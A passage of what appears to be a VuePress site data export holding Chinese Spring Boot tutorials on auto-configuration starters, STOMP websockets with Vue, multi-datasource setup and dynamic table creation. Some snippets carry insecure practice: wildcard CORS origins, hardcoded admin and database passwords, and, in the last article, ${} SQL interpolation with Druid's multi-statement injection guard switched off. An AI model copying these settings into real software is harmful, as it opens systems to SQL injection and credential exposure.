.authenticationcep(authenticationcep)\n                .authorizationcep(authorizationcep)\n                .build();\n        registration.setfilter(authenticationfilter);\n        //配置过滤路径\n        registration.addurlpatterns("/*");\n        //设置filter名称\n        registration.setname("authenticationfilter");\n        //请求中过滤器执行的先后顺序，值越小越先执行\n        registration.setorder(1);\n        return registration;\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n\n\n最主要得就是注解，至于业务逻辑大家都是写自己得。\n\n\n# 四、指定加载文件路径\n\n在 resources 目录下新建 meta-inf 文件夹，在 meta-inf 文件夹下在新建 spring.factories 文件，且在文添加以下内容\n\n# auto configure\norg.springframework.boot.autoconfigure.enableautoconfiguration=com.xianwt.cloud.properties.authenticationconfiguration\n\n\n1\n2\n\n\n不出问题大家发布后，在别的项目依赖自己的 jar 就可以了。但除了 enableautoconfiguration 外还有其他的一些类可以共我们使用：\n\n * enableautoconfiguration：指定自动配置类，启动会执行指定的类。\n * applicationcontextinitializer：初始化应用程序上下文的回调接口，可以帮助我们拿到 applicationcontext。\n * applicationlistener：监听应用程序事件的回调接口，这里可以监听 contextrefreshedevent 当应用程序上下文被初始化或刷新时触发；applicationstartedevent 当 spring 应用程序上下文准备完毕后，但尚未运行时触发；applicationreadyevent 当应用程序已经启动并准备好服务请求时触发；contextclosedevent 当应用程序上下文关闭时触发；也可以触发我们的自定义事件。\n * conditioncontributor：为自动配置提供额外的条件，可以用 @conditionalonproperty 来代替。\n * templateavailabilityprovider：在运行时检查可用模板的策略接口，使用它们来确定是否存在正确的模板文件。\n\n\n# 五、介绍下其他条件装配注解\n\n@conditionalonbean 在当前上下文中存在某个对象时，才会实例化一个 bean\n@conditionalonmissingbean 在当前上下文中不存在某个对象时，才会实例化一个 bean\n@conditiona lonclass 表示当 class path 有指定的类时，配置生效。\n@conditionalonmissingclass 表示当 classpath 中没有指定的类的时候，配置生效。\n@conditionalonproperty 注解根据 name 来读取 spring boot 的 environment 的 变量包含的属性，根据其值与 havingvalue 的值比较结果决定配置是否生效。如果没有指定 havingvalue ，只要属性不为 false ，配置都能生效。matcblfmissing 为例 意味着如果 environment 没有包含 “message.center.enabled”，配置也能生效，默认为 false。\n@conditionalonexpression ，当表达式为 true 时，才会实例化一个 bean ，支持 spel 表达式，比如根据配置文件中的某个值来决定配置是否生效。\n@conditionalonjava ，当存在指定的 java 版本的时候。\n\n\n# 六、升级到 springboot3 使用 starter\n\n在 springboot2.7 就已经说明建议使用 meta-inf/spring/org.springframework.boot.autoconfigure.autoconfiguration.imports 的方式作为定义自动装配文件位置。而在 3.0 版本，已经是移除了 meta-inf/spring.factories，所以我们继续通过 meta-inf/spring.factories 文件定义将不在生效。\n\n\x3c!-- 添加依赖 --\x3e\n<dependency>\n    <groupid>org.springframework.boot</groupid>\n    <artifactid>spring-boot-autoconfigure</artifactid>\n</dependency>\n\n\x3c!-- 对 @configurationproperties 的处理 --\x3e\n<dependency>\n    <groupid>org.springframework.boot</groupid>\n    <artifactid>spring-boot-configuration-processor</artifactid>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n@autoconfiguration\n@enableconfigurationproperties(value = testproperties.class)\npublic class testautoconfiguration {\n\n    @bean\n    public testtemplate testtemplate(){\n        return new testtemplate ();\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n@autoconfiguration 是 spring boot2.7 新引入的，自动配置类必须放进下面的文件里才算自动配置类\n\n在 meta-inf/spring/org.springframework.boot.autoconfigure.autoconfiguration.imports 文件里面添加\n\ncom.spring.demo.test.testautoconfiguration\n\n\n1\n',charsets:{cjk:!0}},{title:"SpringBoot 之 Stomp 使用和 vue 相配置",frontmatter:{title:"SpringBoot 之 Stomp 使用和 vue 相配置",date:"2023-06-25T09:22:36.000Z",permalink:"/spring/spring-boot/202/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.java/20.Spring/23.springboot/202.SpringBoot%20%E4%B9%8B%20Stomp%20%E4%BD%BF%E7%94%A8%E5%92%8C%20vue%20%E7%9B%B8%E9%85%8D%E7%BD%AE.html",relativePath:"00.java/20.Spring/23.springboot/202.SpringBoot 之 Stomp 使用和 vue 相配置.md",key:"v-63e5293d",path:"/spring/spring-boot/202/",headers:[{level:2,title:"后端代码",slug:"后端代码",normalizedTitle:"后端代码",charIndex:2},{level:2,title:"前端代码",slug:"前端代码",normalizedTitle:"前端代码",charIndex:2352}],lastUpdated:"12/22/2023, 11:52:48 AM",lastUpdatedTimestamp:1703217168e3,headersStr:"后端代码 前端代码",content:'# 后端代码\n\n依赖\n\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-websocket</artifactId>\n</dependency>\n\n\n1\n2\n3\n4\n\n\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.messaging.simp.config.MessageBrokerRegistry;\nimport org.springframework.web.socket.config.annotation.EnableWebSocketMessageBroker;\nimport org.springframework.web.socket.config.annotation.StompEndpointRegistry;\nimport org.springframework.web.socket.config.annotation.WebSocketMessageBrokerConfigurer;\n\n/**\n * 通过EnableWebSocketMessageBroker 开启使用STOMP协议来传输基于代理(message broker)的消息,此时浏览器支持使用@MessageMapping 就像支持@RequestMapping一样。\n * @author zhenghuasheng\n */\n@Configuration\n@EnableWebSocketMessageBroker\npublic class WebSocketConfig implements WebSocketMessageBrokerConfigurer {\n\n    /**\n     * 注册stomp的端点\n     */\n    @Override\n    public void registerStompEndpoints(StompEndpointRegistry registry) {\n        // 用户订阅主题的前缀 /topic 代表发布广播，即群发 /queue 代表点对点，即发指定用户\n        registry.addEndpoint("/webSocket")\n                // 设置跨域\n                .setAllowedOrigins("*")\n                //添加socket拦截器，用于从请求中获取客户端标识参数 目前没什么用，可以去掉\n                .addInterceptors(new MyHandShakeInterceptor())\n                .withSockJS();\n    }\n\n    /**\n     * 配置消息代理(message broker)\n     * @param registry\n     */\n    @Override\n    public void configureMessageBroker(MessageBrokerRegistry registry) {\n//        ThreadPoolTaskScheduler te = new ThreadPoolTaskScheduler();\n//        te.setPoolSize(1);\n//        te.setThreadNamePrefix("wss-heartbeat-thread-");\n//        te.initialize();\n        // 代理用不到\n//        registry.enableStompBrokerRelay().setClientLogin("111").setClientPasscode("111").setRelayPort(8005);\n        // 订阅Broker名称\n        registry.enableSimpleBroker("/queue","/topic")\n                // 第一个参数表示服务器写入或发送心跳的频率。 第二个参数表示客户端发送心跳时间\n//                .setHeartbeatValue(new long[]{15000,3000})\n//                .setTaskScheduler(te)\n        ;\n        // 全局使用的消息前缀（客户端订阅路径上会体现出来）\n//        registry.setApplicationDestinationPrefixes("/app");\n        // 点对点使用的订阅前缀（客户端订阅路径上会体现出来），不设置的话，默认也是/user/\n        // registry.setUserDestinationPrefix("/user/");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n\n\n\n# 前端代码\n\n依赖\n\nnpm install sockjs-client\nnpm install stompjs\nnpm install net\nnpm install vue-stomp\n\n\n1\n2\n3\n4\n\n\n封装 stomp.js\n\nimport SockJS from \'sockjs-client\'\nimport Stomp from \'webstomp-client\'\n\nexport default {\n  // 是否启用日志 默认启用\n  debug:true,\n  // 客户端连接信息\n  stompClient:{},\n  // 初始化\n  init(callBack){\n    const socket = new SockJS(\'http://127.0.0.1:8005/webSocket\')\n    this.stompClient = Stomp.over(socket)\n    this.stompClient.hasDebug = this.debug\n    this.stompClient.connect({},suce =>{\n      this.console("连接成功,信息如下 ↓");\n      this.console(this.stompClient);\n      if(callBack){\n        callBack();\n      }\n    },err => {\n      if(err) {\n        this.console("连接失败,信息如下 ↓")\n        this.console(err)\n      }\n    });\n  },\n  // 订阅\n  sub(address,callBack){\n    if(!this.stompClient.connected){\n      this.console("没有连接,无法订阅");\n      return;\n    }\n    // 生成 id\n    let timestamp= new Date().getTime() + address\n    this.console("订阅成功 -> "+address)\n    this.stompClient.subscribe(address,message => {\n      this.console(address+" 订阅消息通知,信息如下 ↓")\n      this.console(message)\n      let data = message.body;\n      callBack(data);\n    },{\n      id: timestamp\n    })\n  },\n  unSub(address){\n    if(!this.stompClient.connected){\n      this.console("没有连接,无法取消订阅 -> "+address);\n      return;\n    }\n    let id = ""\n    for(let item in this.stompClient.subscriptions){\n      if(item.endsWith(address)){\n        id = item;\n        break;\n      }\n    }\n    this.stompClient.unsubscribe(id);\n    this.console("取消订阅成功 -> id:"+ id + " address:"+address)\n  },\n  // 断开连接\n  disconnect(callBack){\n    if(!this.stompClient.connected){\n      this.console("没有连接,无法断开连接");\n      return;\n    }\n    this.stompClient.disconnect(() =>{\n      console.log("断开成功")\n      if(callBack){\n        callBack()\n      }\n    });\n  },\n  // 单位 秒\n  reconnect(time){\n    setInterval(() =>{\n      if(!this.stompClient.connected){\n        this.console("重新连接中...")\n        this.init()\n      }\n    },time * 1000)\n  },\n  console(msg){\n    if(this.debug){\n      console.log(msg);\n    }\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n\n\n以上是我自己封装的一个 stomp.js，建议在登录之后调用 init，并且保证 订阅 和 init 等所有 API 在一个文件中使用，否则会 undefined。可以使用 eventBus 来传递数据。\n\n具体使用\n\n  mounted() {\n    // 初始化\n    stomp.init(() =>{\n      // 初始化成功 就执行订阅\n      stomp.sub("/topic",data =>{\n        console.log(data)\n      })\n      stomp.sub("/topic1",data =>{\n        console.log(data)\n      })\n      // 取消订阅\n      stomp.unSub("/topic")\n    })\n    //  启用重连 5秒检测一次\n    stomp.reconnect(5)\n  },\n  destroyed() {\n    stomp.disconnect()\n  }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n连接通了以后，如果说前端用 websocket 只是为了接收后端的消息，那么关于 topic 可以随便设置，这里的随便意思是后端不需要去在 configureMessageBroker 里设置任何东西，只需要和前端定义清楚 topic，后端可以动态 topic 给前端。如下：\n\n\n\n\n\n',normalizedContent:'# 后端代码\n\n依赖\n\n<dependency>\n    <groupid>org.springframework.boot</groupid>\n    <artifactid>spring-boot-starter-websocket</artifactid>\n</dependency>\n\n\n1\n2\n3\n4\n\n\nimport org.springframework.context.annotation.configuration;\nimport org.springframework.messaging.simp.config.messagebrokerregistry;\nimport org.springframework.web.socket.config.annotation.enablewebsocketmessagebroker;\nimport org.springframework.web.socket.config.annotation.stompendpointregistry;\nimport org.springframework.web.socket.config.annotation.websocketmessagebrokerconfigurer;\n\n/**\n * 通过enablewebsocketmessagebroker 开启使用stomp协议来传输基于代理(message broker)的消息,此时浏览器支持使用@messagemapping 就像支持@requestmapping一样。\n * @author zhenghuasheng\n */\n@configuration\n@enablewebsocketmessagebroker\npublic class websocketconfig implements websocketmessagebrokerconfigurer {\n\n    /**\n     * 注册stomp的端点\n     */\n    @override\n    public void registerstompendpoints(stompendpointregistry registry) {\n        // 用户订阅主题的前缀 /topic 代表发布广播，即群发 /queue 代表点对点，即发指定用户\n        registry.addendpoint("/websocket")\n                // 设置跨域\n                .setallowedorigins("*")\n                //添加socket拦截器，用于从请求中获取客户端标识参数 目前没什么用，可以去掉\n                .addinterceptors(new myhandshakeinterceptor())\n                .withsockjs();\n    }\n\n    /**\n     * 配置消息代理(message broker)\n     * @param registry\n     */\n    @override\n    public void configuremessagebroker(messagebrokerregistry registry) {\n//        threadpooltaskscheduler te = new threadpooltaskscheduler();\n//        te.setpoolsize(1);\n//        te.setthreadnameprefix("wss-heartbeat-thread-");\n//        te.initialize();\n        // 代理用不到\n//        registry.enablestompbrokerrelay().setclientlogin("111").setclientpasscode("111").setrelayport(8005);\n        // 订阅broker名称\n        registry.enablesimplebroker("/queue","/topic")\n                // 第一个参数表示服务器写入或发送心跳的频率。 第二个参数表示客户端发送心跳时间\n//                .setheartbeatvalue(new long[]{15000,3000})\n//                .settaskscheduler(te)\n        ;\n        // 全局使用的消息前缀（客户端订阅路径上会体现出来）\n//        registry.setapplicationdestinationprefixes("/app");\n        // 点对点使用的订阅前缀（客户端订阅路径上会体现出来），不设置的话，默认也是/user/\n        // registry.setuserdestinationprefix("/user/");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n\n\n\n# 前端代码\n\n依赖\n\nnpm install sockjs-client\nnpm install stompjs\nnpm install net\nnpm install vue-stomp\n\n\n1\n2\n3\n4\n\n\n封装 stomp.js\n\nimport sockjs from \'sockjs-client\'\nimport stomp from \'webstomp-client\'\n\nexport default {\n  // 是否启用日志 默认启用\n  debug:true,\n  // 客户端连接信息\n  stompclient:{},\n  // 初始化\n  init(callback){\n    const socket = new sockjs(\'http://127.0.0.1:8005/websocket\')\n    this.stompclient = stomp.over(socket)\n    this.stompclient.hasdebug = this.debug\n    this.stompclient.connect({},suce =>{\n      this.console("连接成功,信息如下 ↓");\n      this.console(this.stompclient);\n      if(callback){\n        callback();\n      }\n    },err => {\n      if(err) {\n        this.console("连接失败,信息如下 ↓")\n        this.console(err)\n      }\n    });\n  },\n  // 订阅\n  sub(address,callback){\n    if(!this.stompclient.connected){\n      this.console("没有连接,无法订阅");\n      return;\n    }\n    // 生成 id\n    let timestamp= new date().gettime() + address\n    this.console("订阅成功 -> "+address)\n    this.stompclient.subscribe(address,message => {\n      this.console(address+" 订阅消息通知,信息如下 ↓")\n      this.console(message)\n      let data = message.body;\n      callback(data);\n    },{\n      id: timestamp\n    })\n  },\n  unsub(address){\n    if(!this.stompclient.connected){\n      this.console("没有连接,无法取消订阅 -> "+address);\n      return;\n    }\n    let id = ""\n    for(let item in this.stompclient.subscriptions){\n      if(item.endswith(address)){\n        id = item;\n        break;\n      }\n    }\n    this.stompclient.unsubscribe(id);\n    this.console("取消订阅成功 -> id:"+ id + " address:"+address)\n  },\n  // 断开连接\n  disconnect(callback){\n    if(!this.stompclient.connected){\n      this.console("没有连接,无法断开连接");\n      return;\n    }\n    this.stompclient.disconnect(() =>{\n      console.log("断开成功")\n      if(callback){\n        callback()\n      }\n    });\n  },\n  // 单位 秒\n  reconnect(time){\n    setinterval(() =>{\n      if(!this.stompclient.connected){\n        this.console("重新连接中...")\n        this.init()\n      }\n    },time * 1000)\n  },\n  console(msg){\n    if(this.debug){\n      console.log(msg);\n    }\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n\n\n以上是我自己封装的一个 stomp.js，建议在登录之后调用 init，并且保证 订阅 和 init 等所有 api 在一个文件中使用，否则会 undefined。可以使用 eventbus 来传递数据。\n\n具体使用\n\n  mounted() {\n    // 初始化\n    stomp.init(() =>{\n      // 初始化成功 就执行订阅\n      stomp.sub("/topic",data =>{\n        console.log(data)\n      })\n      stomp.sub("/topic1",data =>{\n        console.log(data)\n      })\n      // 取消订阅\n      stomp.unsub("/topic")\n    })\n    //  启用重连 5秒检测一次\n    stomp.reconnect(5)\n  },\n  destroyed() {\n    stomp.disconnect()\n  }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n连接通了以后，如果说前端用 websocket 只是为了接收后端的消息，那么关于 topic 可以随便设置，这里的随便意思是后端不需要去在 configuremessagebroker 里设置任何东西，只需要和前端定义清楚 topic，后端可以动态 topic 给前端。如下：\n\n\n\n\n\n',charsets:{cjk:!0}},{title:"SpringBoot MyBatisPlus 实现多数据源",frontmatter:{title:"SpringBoot MyBatisPlus 实现多数据源",date:"2023-06-25T09:22:36.000Z",permalink:"/spring/spring-boot/203/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.java/20.Spring/23.springboot/203.SpringBoot%20MyBatisPlus%20%E5%AE%9E%E7%8E%B0%E5%A4%9A%E6%95%B0%E6%8D%AE%E6%BA%90.html",relativePath:"00.java/20.Spring/23.springboot/203.SpringBoot MyBatisPlus 实现多数据源.md",key:"v-4eb895bc",path:"/spring/spring-boot/203/",lastUpdated:"12/22/2023, 11:52:48 AM",lastUpdatedTimestamp:1703217168e3,headersStr:null,content:'在 spring boot 整合中还是会出现问题。如下：\n\nDescription:\n\nFailed to configure a DataSource: \'url\' attribute is not specified and no embedded datasource could be configured.\n\n\n1\n2\n3\n\n\n只需要在 配置文件中加如下：\n\nspring:\n  autoconfigure:\n    exclude: com.alibaba.druid.spring.boot.autoconfigure.DruidDataSourceAutoConfigure\n\n\n1\n2\n3\n\n\n用的是 Druid 的数据源，所以排除 Druid 使用 spring boot 自带的。\n\n依赖\n\n\x3c!-- 数据持久相关配置 --\x3e\n<dependency>\n    <groupId>com.baomidou</groupId>\n    <artifactId>mybatis-plus-boot-starter</artifactId>\n    <version>${mybatis-plus}</version>\n</dependency>\n\n\x3c!-- 驱动 --\x3e\n<dependency>\n    <groupId>mysql</groupId>\n    <artifactId>mysql-connector-java</artifactId>\n</dependency>\n\n<dependency>\n    <groupId>com.alibaba</groupId>\n    <artifactId>druid-spring-boot-starter</artifactId>\n    <version>${db-drive}</version>\n</dependency>\n\n\x3c!-- 多数据源 --\x3e\n<dependency>\n    <groupId>com.baomidou</groupId>\n    <artifactId>dynamic-datasource-spring-boot-starter</artifactId>\n    <version>3.1.1</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n配置文件\n\nspring:\n  main:\n    allow-bean-definition-overriding: true\n  autoconfigure:\n    exclude: com.alibaba.druid.spring.boot.autoconfigure.DruidDataSourceAutoConfigure\n  datasource:\n    # 配置监控\n    druid:\n      stat-view-servlet:\n        # 在1.1.9版本不需要，以上必须要\n        enabled: true\n        url-pattern: "/druid/*"\n        # IP白名单(没有配置或者为空，则允许所有访问)\n        allow: 127.0.0.1\n        # IP黑名单 (存在共同时，deny优先于allow)\n        deny: 192.168.1.73\n        # 禁用HTML页面上的“Reset All”功能\n        reset-enable: true\n        # 登录名\n        login-username: admin\n        # 登录密码\n        login-password: admin@2020\n      web-stat-filter:\n        enabled: true\n        url-pattern: "/*"\n        exclusions: "*.js,*.gif,*.jpg,*.bmp,*.png,*.css,*.ico,/druid/*"\n    dynamic:\n      druid:\n        # 配置监控统计拦截的filters,去掉后，监控界面的sql无法统计\n        # filter 提供的所有log 是为了 输出JDBC执行的日志\n        filters: stat,wall\n        # 初始化连接大小\n        initial-size: 30\n        # 最小空闲连接数\n        min-idle: 20\n        # 最大连接数\n        maxActive: 200\n        # 获取连接时最大等待时间，单位毫秒，使用\n        maxWait: 10000\n        # maxWait 并发效率会有所下降，maxWait 会造成公平锁，useUnfairLock 使用非公平锁\n        useUnfairLock: true\n        # 检测连接是否可用的测试语句 如果为 null，testOnBorrow testOnReturn testWhileIdle 都不起作用\n        validation-query: \'select 1\'\n        # testWhileIdle(空闲时检测)：如果为true（默认true），当应用向连接池申请连接，并且testOnBorrow为false时，连接池将会判断连接是否处于空闲状态，如果是，则验证这条连接是否可用。\n        # testWhileIdle什么时候会起作用? 获取连接时 且 testOnBorrow=false testWhileIdle=true\n        testWhileIdle: true\n        # testOnBorrow(获取连接时检测) 检测池里连接的可用性 false 不检测 true 检测.但消耗性能。\n        # 假如连接池中的连接被数据库关闭了，应用通过连接池getConnection时，可能获取到这些不可用的连接，且这些连接如果不被其他线程回收的话，它们不会被连接池被废除，也不会重新被创建，\n        # 占用了连接池的名额，项目本身作为服务端，数据库链接被关闭，客户端调用服务端就会出现大量的timeout，客户端设置了超时时间，然而主动断开，服务端必然出现close_wait。\n        testOnBorrow: false\n        # 连接保持空闲而不被驱逐的最小时间,如果说连接的真正空闲时间 等于该值，则关闭物理连接\n        # minEvictableIdleTimeMillis: 30000\n        testOnReturn: false\n      primary: wiedp\n      datasource:\n        # 主库\n        wiedp:\n          url: jdbc:mysql://10.xx.xx.100:3306/wiedp?useUnicode=true&characterEncoding=UTF-8&autoReconnect=true&useSSL=false&zeroDateTimeBehavior=convertToNull&&serverTimezone=Asia/Shanghai\n          driver-class-name: com.mysql.cj.jdbc.Driver\n          type: com.alibaba.druid.pool.DruidDataSource\n          username: xx\n#          password: xx@2020\n          password: mysql@dev.2020\n        # 采集库\n        iedp:\n          url: jdbc:mysql://10.xx.xx.101:3306/iedp?useUnicode=true&characterEncoding=UTF-8&autoReconnect=true&useSSL=false&zeroDateTimeBehavior=convertToNull&&serverTimezone=Asia/Shanghai\n          driver-class-name: com.mysql.cj.jdbc.Driver\n          type: com.alibaba.druid.pool.DruidDataSource\n          username: xxxx\n          password: xxxx@xxxx\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n\n\n官方完整案例',normalizedContent:'在 spring boot 整合中还是会出现问题。如下：\n\ndescription:\n\nfailed to configure a datasource: \'url\' attribute is not specified and no embedded datasource could be configured.\n\n\n1\n2\n3\n\n\n只需要在 配置文件中加如下：\n\nspring:\n  autoconfigure:\n    exclude: com.alibaba.druid.spring.boot.autoconfigure.druiddatasourceautoconfigure\n\n\n1\n2\n3\n\n\n用的是 druid 的数据源，所以排除 druid 使用 spring boot 自带的。\n\n依赖\n\n\x3c!-- 数据持久相关配置 --\x3e\n<dependency>\n    <groupid>com.baomidou</groupid>\n    <artifactid>mybatis-plus-boot-starter</artifactid>\n    <version>${mybatis-plus}</version>\n</dependency>\n\n\x3c!-- 驱动 --\x3e\n<dependency>\n    <groupid>mysql</groupid>\n    <artifactid>mysql-connector-java</artifactid>\n</dependency>\n\n<dependency>\n    <groupid>com.alibaba</groupid>\n    <artifactid>druid-spring-boot-starter</artifactid>\n    <version>${db-drive}</version>\n</dependency>\n\n\x3c!-- 多数据源 --\x3e\n<dependency>\n    <groupid>com.baomidou</groupid>\n    <artifactid>dynamic-datasource-spring-boot-starter</artifactid>\n    <version>3.1.1</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n配置文件\n\nspring:\n  main:\n    allow-bean-definition-overriding: true\n  autoconfigure:\n    exclude: com.alibaba.druid.spring.boot.autoconfigure.druiddatasourceautoconfigure\n  datasource:\n    # 配置监控\n    druid:\n      stat-view-servlet:\n        # 在1.1.9版本不需要，以上必须要\n        enabled: true\n        url-pattern: "/druid/*"\n        # ip白名单(没有配置或者为空，则允许所有访问)\n        allow: 127.0.0.1\n        # ip黑名单 (存在共同时，deny优先于allow)\n        deny: 192.168.1.73\n        # 禁用html页面上的“reset all”功能\n        reset-enable: true\n        # 登录名\n        login-username: admin\n        # 登录密码\n        login-password: admin@2020\n      web-stat-filter:\n        enabled: true\n        url-pattern: "/*"\n        exclusions: "*.js,*.gif,*.jpg,*.bmp,*.png,*.css,*.ico,/druid/*"\n    dynamic:\n      druid:\n        # 配置监控统计拦截的filters,去掉后，监控界面的sql无法统计\n        # filter 提供的所有log 是为了 输出jdbc执行的日志\n        filters: stat,wall\n        # 初始化连接大小\n        initial-size: 30\n        # 最小空闲连接数\n        min-idle: 20\n        # 最大连接数\n        maxactive: 200\n        # 获取连接时最大等待时间，单位毫秒，使用\n        maxwait: 10000\n        # maxwait 并发效率会有所下降，maxwait 会造成公平锁，useunfairlock 使用非公平锁\n        useunfairlock: true\n        # 检测连接是否可用的测试语句 如果为 null，testonborrow testonreturn testwhileidle 都不起作用\n        validation-query: \'select 1\'\n        # testwhileidle(空闲时检测)：如果为true（默认true），当应用向连接池申请连接，并且testonborrow为false时，连接池将会判断连接是否处于空闲状态，如果是，则验证这条连接是否可用。\n        # testwhileidle什么时候会起作用? 获取连接时 且 testonborrow=false testwhileidle=true\n        testwhileidle: true\n        # testonborrow(获取连接时检测) 检测池里连接的可用性 false 不检测 true 检测.但消耗性能。\n        # 假如连接池中的连接被数据库关闭了，应用通过连接池getconnection时，可能获取到这些不可用的连接，且这些连接如果不被其他线程回收的话，它们不会被连接池被废除，也不会重新被创建，\n        # 占用了连接池的名额，项目本身作为服务端，数据库链接被关闭，客户端调用服务端就会出现大量的timeout，客户端设置了超时时间，然而主动断开，服务端必然出现close_wait。\n        testonborrow: false\n        # 连接保持空闲而不被驱逐的最小时间,如果说连接的真正空闲时间 等于该值，则关闭物理连接\n        # minevictableidletimemillis: 30000\n        testonreturn: false\n      primary: wiedp\n      datasource:\n        # 主库\n        wiedp:\n          url: jdbc:mysql://10.xx.xx.100:3306/wiedp?useunicode=true&characterencoding=utf-8&autoreconnect=true&usessl=false&zerodatetimebehavior=converttonull&&servertimezone=asia/shanghai\n          driver-class-name: com.mysql.cj.jdbc.driver\n          type: com.alibaba.druid.pool.druiddatasource\n          username: xx\n#          password: xx@2020\n          password: mysql@dev.2020\n        # 采集库\n        iedp:\n          url: jdbc:mysql://10.xx.xx.101:3306/iedp?useunicode=true&characterencoding=utf-8&autoreconnect=true&usessl=false&zerodatetimebehavior=converttonull&&servertimezone=asia/shanghai\n          driver-class-name: com.mysql.cj.jdbc.driver\n          type: com.alibaba.druid.pool.druiddatasource\n          username: xxxx\n          password: xxxx@xxxx\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n\n\n官方完整案例',charsets:{cjk:!0}},{title:"SpringBoot MyBatis 动态建表",frontmatter:{title:"SpringBoot MyBatis 动态建表",date:"2023-06-25T09:22:36.000Z",permalink:"/spring/spring-boot/204/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.java/20.Spring/23.springboot/204.SpringBoot%20MyBatis%20%E5%8A%A8%E6%80%81%E5%BB%BA%E8%A1%A8.html",relativePath:"00.java/20.Spring/23.springboot/204.SpringBoot MyBatis 动态建表.md",key:"v-61e74299",path:"/spring/spring-boot/204/",lastUpdated:"12/22/2023, 11:52:48 AM",lastUpdatedTimestamp:1703217168e3,headersStr:null,content:'代码\n\n    <update  id="createTelemetryTable" parameterType="java.util.List">\n        <foreach item="item" index="index" collection="list">\n            CREATE TABLE if not exists `${item}` (\n                sys_id bigint NOT NULL,\n                mpnt_id bigint NOT NULL,\n                date_time datetime NOT NULL,\n                value_id DECIMAL(10,2) NOT NULL\n            ) ENGINE=MYISAM DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;\n        </foreach>\n    </update>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n报错\n\nCaused by: java.sql.SQLException: sql injection violation, multi-statement not allow : CREATE TABLE if not exists `rt_telemetry_p` (\n                sys_id bigint NOT NULL,\n                mpnt_id bigint NOT NULL,\n                date_time datetime NOT NULL,\n                value_id DECIMAL(10,2) NOT NULL\n            ) ENGINE=MYISAM DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;\n\n\n1\n2\n3\n4\n5\n6\n\n\n解决房在，在 yml 里 数据库连接 url 中加入 allowMultiQueries=true ，在 yml 里 druid 配置中加入\n\nwall:\n    multi-statement-allow: true\n\n\n1\n2\n',normalizedContent:'代码\n\n    <update  id="createtelemetrytable" parametertype="java.util.list">\n        <foreach item="item" index="index" collection="list">\n            create table if not exists `${item}` (\n                sys_id bigint not null,\n                mpnt_id bigint not null,\n                date_time datetime not null,\n                value_id decimal(10,2) not null\n            ) engine=myisam default 